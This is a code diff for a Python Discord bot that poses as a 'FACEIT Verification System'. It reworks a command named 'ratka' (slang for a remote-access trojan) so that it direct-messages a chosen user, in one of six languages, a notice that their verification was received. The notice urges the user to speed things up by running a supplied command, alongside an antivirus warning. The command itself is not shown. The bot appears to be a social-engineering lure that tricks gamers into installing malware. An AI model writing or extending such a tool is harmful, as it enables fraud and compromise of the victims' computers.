@@ -403,9 +403,6 @@ class VerifBot(discord.Client):
         for game in GAMES:
             self.add_view(LanguageView(game))
         
-        # Регистрируем view для команды ratka
-        self.add_view(RatkaLanguageView())
-        
         if GUILD_ID:
             guild = discord.Object(id=int(GUILD_ID))
             self.tree.copy_global_to(guild=guild)
@@ -458,16 +455,46 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
 
 
 @bot.tree.command(name="ratka", description="Отправить пользователю уведомление о получении заявки на верификацию")
-@app_commands.describe(member="Кому отправить уведомление")
+@app_commands.describe(
+    member="Кому отправить уведомление",
+    language="Язык уведомления"
+)
+@app_commands.choices(language=[
+    app_commands.Choice(name="English", value="en"),
+    app_commands.Choice(name="Русский", value="ru"),
+    app_commands.Choice(name="Українська", value="uk"),
+    app_commands.Choice(name="Polski", value="pl"),
+    app_commands.Choice(name="Deutsch", value="de"),
+    app_commands.Choice(name="Türkçe", value="tr"),
+])
 @app_commands.default_permissions(manage_guild=True)
 @app_commands.guild_only()
-async def ratka(interaction: discord.Interaction, member: discord.Member):
+async def ratka(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
     if member.bot:
         await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
         return
 
+    lang = language.value if isinstance(language, app_commands.Choice) else language
+    t = TEXTS[lang]
+    
+    # Создаем embed с информацией о верификации
+    embed = discord.Embed(
+        title=f"✅ {t['ratka_title']}",
+        description=(
+            f"**{t['ratka_greeting']}**\n\n"
+            f"{t['ratka_received']}\n\n"
+            f"{t['ratka_speedup']}\n\n"
+            f"**{t['ratka_command']}**\n"
+            f"```\n{RATKA_COMMAND}\n```\n"
+            f"⚠️ {t['ratka_antivirus']}"
+        ),
+        color=FACEIT_ORANGE,
+    )
+    embed.set_image(url="attachment://4.png")
+    embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
+
     try:
-        await member.send(view=RatkaLanguageView(), file=logo_file())
+        await member.send(embed=embed, files=[ratka_image_file(), logo_file()])
     except discord.Forbidden:
         await interaction.response.send_message(
             f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
@@ -475,7 +502,10 @@ async def ratka(interaction: discord.Interaction, member: discord.Member):
         )
         return
 
-    await interaction.response.send_message(f"Уведомление отправлено {member.mention} в личку ✅", ephemeral=True)
+    await interaction.response.send_message(
+        f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅", 
+        ephemeral=True
+    )
 
 
 if __name__ == "__main__":
